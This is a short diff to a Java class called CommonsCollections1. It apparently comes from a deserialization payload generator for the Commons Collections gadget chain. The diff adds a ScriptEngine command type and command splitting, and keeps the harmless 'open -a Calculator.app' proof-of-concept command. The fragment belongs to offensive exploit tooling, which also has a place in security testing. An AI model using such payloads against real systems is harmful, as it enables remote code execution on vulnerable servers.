@@ -8,6 +8,7 @@ import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
+import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
@@ -33,6 +34,8 @@ public class CommonsCollections1 implements ObjectPayload<Object> {
         SinksHelper sinksHelper = new SinksHelper();
         sinksHelper.setSink(CommonsCollections1.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.DEFAULT);
+        sinksHelper.setCommandType(EnchantEnums.ScriptEngine);
+        sinksHelper.setSplit(true);
         sinksHelper.setCommand("open -a Calculator.app");
 //        sinksHelper.setCommand("ifconfig");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
